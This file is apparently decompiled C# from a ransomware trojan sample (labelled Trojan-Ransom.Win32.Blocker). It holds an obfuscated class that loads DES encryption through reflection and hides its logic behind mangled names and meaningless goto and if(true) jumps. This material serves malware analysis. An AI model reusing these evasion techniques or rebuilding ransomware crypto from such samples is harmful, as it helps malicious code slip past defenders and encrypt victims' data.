// Decompiled with JetBrains decompiler
// Type: #p.#r
// Assembly: SynMood, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E74E0BE3-2156-4FD1-87D6-9C934F391488
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asay-91a905762db9f9c40fe89fad88d7cbf29ff032af.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0023p
{
  internal sealed class \u0023r : IDisposable
  {
    private readonly Type \u0023dE;
    private readonly object \u0023eE;

    public \u0023r()
    {
      this.\u0023dE = Assembly.Load("mscorlib").GetType("System.Security.Cryptography.DESCryptoServiceProvider");
      this.\u0023eE = Activator.CreateInstance(this.\u0023dE);
    }

    public ICryptoTransform \u0023q([In] byte[] obj0, [In] byte[] obj1, [In] bool obj2)
    {
      MethodInfo setMethod1 = this.\u0023dE.GetProperty("Key").GetSetMethod();
      object eE1 = this.\u0023eE;
      object[] objArray1 = new object[1];
      if (true)
        goto label_4;
label_1:
      object[] objArray2;
      objArray2[0] = (object) obj0;
      object[] parameters1 = objArray2;
      setMethod1.Invoke(eE1, parameters1);
      MethodInfo setMethod2 = this.\u0023dE.GetProperty("IV").GetSetMethod();
      object eE2 = this.\u0023eE;
      object[] objArray3 = new object[1];
      if (true)
        goto label_5;
label_2:
      objArray2[0] = (object) obj1;
      object[] parameters2 = objArray2;
      setMethod2.Invoke(eE2, parameters2);
      MethodInfo method = this.\u0023dE.GetMethod(obj2 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
      if (true)
        goto label_6;
label_3:
      MethodInfo methodInfo;
      return (ICryptoTransform) methodInfo.Invoke(this.\u0023eE, new object[0]);
label_6:
      methodInfo = method;
      goto label_3;
label_5:
      objArray2 = objArray3;
      goto label_2;
label_4:
      objArray2 = objArray1;
      goto label_1;
    }

    public void \u0023m()
    {
      do
      {
        if (true)
          this.\u0023dE.GetMethod("Clear").Invoke(this.\u0023eE, new object[0]);
      }
      while (false);
    }

    public void \u0023n()
    {
      if (false)
        return;
      this.\u0023m();
    }
  }
}
